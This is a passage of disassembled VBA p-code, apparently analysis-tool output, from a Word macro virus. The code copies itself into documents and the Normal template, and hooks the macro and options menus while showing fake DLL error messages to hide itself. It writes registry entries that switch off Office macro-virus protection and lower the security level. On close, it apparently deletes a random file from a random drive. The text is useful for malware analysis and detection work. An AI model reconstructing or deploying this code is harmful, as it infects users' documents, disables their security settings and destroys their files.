' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #59:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #61:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #62:
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0002 
' Line #63:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Count 
' 	For 
' Line #70:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0011 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0011 "'NIST_32abcp2CETp"
' 	Ne 
' 	IfBlock 
' Line #71:
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #72:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #76:
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld Nt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #81:
' 	LitDI2 0x0001 
' 	ArgsCall DPIO 0x0001 
' Line #82:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Sd 
' Line #84:
' 	Ld Sd 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #87:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Sd 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld Sd 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0002 
' 	Lt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0003 "DOC"
' 	ArgsCall RCy 0x0002 
' 	EndIf 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	LitStr 0x0004 "File"
' 	LitDI2 0x0017 
' 	LitStr 0x0008 "FileOpen"
' 	ArgsCall SMHk 0x0003 
' Line #95:
' 	LitStr 0x0004 "File"
' 	LitDI2 0x0003 
' 	LitStr 0x0008 "FileSave"
' 	ArgsCall SMHk 0x0003 
' Line #96:
' 	LitStr 0x0005 "Tools"
' 	LitDI2 0x020A 
' 	LitStr 0x000C "ToolsOptions"
' 	ArgsCall SMHk 0x0003 
' Line #97:
' 	LitStr 0x0005 "Tools"
' 	LitDI2 0x02EF 
' 	LitStr 0x000D "FileTemplates"
' 	ArgsCall SMHk 0x0003 
' Line #98:
' 	LitStr 0x0005 "Tools"
' 	LitDI2 0x031D 
' 	LitStr 0x0003 "xxx"
' 	ArgsCall SMHk 0x0003 
' Line #99:
' 	LitStr 0x0005 "Macro"
' 	LitDI2 0x069F 
' 	LitStr 0x000A "ViewVBCode"
' 	ArgsCall SMHk 0x0003 
' Line #100:
' 	LitStr 0x0005 "Macro"
' 	LitDI2 0x00BA 
' 	LitStr 0x000A "ToolsMacro"
' 	ArgsCall SMHk 0x0003 
' Line #101:
' 	LitDI2 0x0001 
' 	UMi 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #102:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #103:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Private Sub Document_Close())
' Line #106:
' 	Dim 
' 	VarDefn Res (As String)
' 	VarDefn X (As String)
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #109:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #110:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #111:
' 	ArgsCall Document_Open 0x0000 
' Line #112:
' 	ArgsCall ASD 0x0000 
' Line #113:
' 	ArgsLd GDs 0x0000 
' 	FnLen 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0042 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd RnDr 0x0001 
' 	St Res 
' Line #114:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd RFe 0x0002 
' 	St X 
' 	EndIf 
' Line #115:
' 	Ld X 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #116:
' 	Ld X 
' 	Ld X 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0002 "DO"
' 	Ne 
' 	IfBlock 
' Line #117:
' 	Ld Res 
' 	Ld X 
' 	Concat 
' 	St Res 
' Line #118:
' 	ElseBlock 
' Line #119:
' 	LitStr 0x0000 ""
' 	St Res 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	ElseBlock 
' Line #122:
' 	LitStr 0x0000 ""
' 	St Res 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	ArgsCall DFe 0x0001 
' 	EndIf 
' Line #125:
' 	LitDI2 0x0001 
' 	UMi 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #126:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #127:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Private Sub Document_New())
' Line #130:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #131:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #132:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #133:
' 	ArgsCall Document_Open 0x0000 
' Line #134:
' 	ArgsCall AWd 0x0000 
' Line #135:
' 	LitDI2 0x0001 
' 	UMi 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #136:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #137:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Private Sub AutoExec())
' Line #140:
' 	ArgsCall Document_Open 0x0000 
' Line #141:
' 	EndSub 
' Line #142:
' 	FuncDefn (Private Sub AutoExit())
' Line #143:
' 	ArgsCall Document_Open 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Private Sub FileOpen())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	StartWithExpr 
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #148:
' 	ArgsMemCallWith Display 0x0000 
' Line #149:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #150:
' 	MemLdWith New 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #151:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith ReadOnly 
' Line #152:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #153:
' 	ArgsMemCallWith Execute 0x0000 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	EndWith 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Private Sub FileSave())
' Line #158:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #159:
' 	ArgsCall Document_Open 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Private Sub Auto_Save())
' Line #162:
' 	ArgsCall Document_Open 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #165:
' 	ArgsCall Document_Open 0x0000 
' Line #166:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #169:
' 	ArgsCall Document_Open 0x0000 
' Line #170:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Private Sub FileTemplates())
' Line #173:
' 	LitDI2 0x0001 
' 	ArgsCall DPIO 0x0001 
' Line #174:
' 	ArgsCall Document_Open 0x0000 
' Line #175:
' 	LitStr 0x001A "Global template not loaded"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #176:
' 	EndSub 
' Line #177:
' 	FuncDefn (Private Sub ToolsOptions())
' Line #178:
' 	OnError (Resume Next) 
' Line #179:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #180:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #181:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Private Sub DPIO(SaveF As Boolean))
' Line #184:
' 	Dim 
' 	VarDefn FNum (As Integer)
' Line #185:
' 	Dim (Const) 
' 	LitStr 0x000D "dword:0000000"
' 	VarDefn Param
' Line #186:
' 	Dim (Const) 
' 	LitStr 0x001B "\Software\Microsoft\Office\"
' 	VarDefn Path
' Line #187:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	VarDefn Ver (As String)
' Line #188:
' 	LitStr 0x0004 "8.0\"
' 	LitDI2 0x0001 
' 	ArgsSt Ver 0x0001 
' Line #189:
' 	LitStr 0x0004 "9.0\"
' 	LitDI2 0x0002 
' 	ArgsSt Ver 0x0001 
' Line #190:
' 	Dim (Const) 
' 	LitStr 0x0012 "New User Settings\"
' 	VarDefn NewUse
' Line #191:
' 	Dim (Const) 
' 	LitStr 0x0009 "\.Default"
' 	VarDefn Def
' Line #192:
' 	Dim (Const) 
' 	LitStr 0x0008 "Security"
' 	VarDefn Sec
' Line #193:
' 	Dim (Const) 
' 	LitStr 0x0005 "Level"
' 	VarDefn Lev
' Line #194:
' 	Dim (Const) 
' 	LitStr 0x000F "c:\~WRL8369.tmp"
' 	VarDefn temp
' Line #195:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Keys (As String)
' Line #196:
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	LitDI2 0x0001 
' 	ArgsSt Keys 0x0001 
' Line #197:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	LitDI2 0x0002 
' 	ArgsSt Keys 0x0001 
' Line #198:
' 	LitStr 0x000A "HKEY_USERS"
' 	LitDI2 0x0003 
' 	ArgsSt Keys 0x0001 
' Line #199:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn Dis (As String)
' Line #200:
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	LitDI2 0x0001 
' 	ArgsSt Dis 0x0001 
' Line #201:
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0002 
' 	ArgsSt Dis 0x0001 
' Line #202:
' 	LitStr 0x0014 "MacroVirusProtection"
' 	LitDI2 0x0003 
' 	ArgsSt Dis 0x0001 
' Line #203:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	VarDefn AddId (As String)
' Line #204:
' 	LitStr 0x000C "Word\Options"
' 	LitDI2 0x0001 
' 	ArgsSt AddId 0x0001 
' Line #205:
' 	LitStr 0x0015 "Excel\Microsoft Excel"
' 	LitDI2 0x0002 
' 	ArgsSt AddId 0x0001 
' Line #206:
' 	LitStr 0x0012 "PowerPoint\Options"
' 	LitDI2 0x0003 
' 	ArgsSt AddId 0x0001 
' Line #207:
' 	LitStr 0x0010 "Word\7.0\Options"
' 	LitDI2 0x0004 
' 	ArgsSt AddId 0x0001 
' Line #208:
' 	LitStr 0x0019 "Excel\7.0\Microsoft Excel"
' 	LitDI2 0x0005 
' 	ArgsSt AddId 0x0001 
' Line #209:
' 	LitStr 0x0016 "PowerPoint\7.0\Options"
' 	LitDI2 0x0006 
' 	ArgsSt AddId 0x0001 
' Line #210:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #211:
' 	Dim 
' 	VarDefn k (As Integer)
' Line #212:
' 	Dim 
' 	VarDefn X (As Integer)
' Line #213:
' 	Dim 
' 	VarDefn Use (As String)
' Line #214:
' 	OnError (Resume Next) 
' Line #215:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #216:
' 	Ld SaveF 
' 	IfBlock 
' Line #217:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0002 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	LitDI2 0x0014 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "LoadPowerConfig"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St Use 
' Line #218:
' 	Ld Use 
' 	FnLen 
' 	LitDI2 0x000F 
' 	Gt 
' 	Coerce (Bool) 
' 	If 
' 	BoSImplicit 
' 	Ld Use 
' 	Ld Use 
' 	FnLen 
' 	LitDI2 0x000F 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	Coerce (Bool) 
' 	If 
' 	BoSImplicit 
' 	Ld Use 
' 	Ld Use 
' 	FnLen 
' 	LitDI2 0x000F 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x00D4 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	Coerce (Bool) 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St SaveF 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	Ld SaveF 
' 	IfBlock 
' Line #221:
' 	Ld Friend 
' 	St FNum 
' Line #222:
' 	Ld temp 
' 	Ld FNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #223:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #224:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0021 "\System\CurrentControlSet\control"
' 	Concat 
' 	LitStr 0x000C "Current User"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St Use 
' Line #227:
' 	Ld Use 
' 	LitStr 0x0008 ".Default"
' 	Ne 
' 	Paren 
' 	Ld SaveF 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St X 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St X 
' 	EndIf 
' Line #228:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld X 
' 	For 
' Line #229:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #230:
' 	Ld k 
' 	SelectCase 
' Line #231:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #232:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #233:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #234:
' 	Ld SaveF 
' 	IfBlock 
' Line #235:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "["
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld NewUse 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	PrintItemNL 
' Line #236:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #237:
' 	EndIfBlock 
' Line #238:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #239:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #240:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #241:
' 	Ld SaveF 
' 	IfBlock 
' Line #242:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "["
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	PrintItemNL 
' Line #243:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #244:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "["
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x000B 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Choose 0x0004 
' 	Concat 
' 	Ld Sec 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	PrintItemNL 
' Line #245:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Ld Lev 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld Param 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #248:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
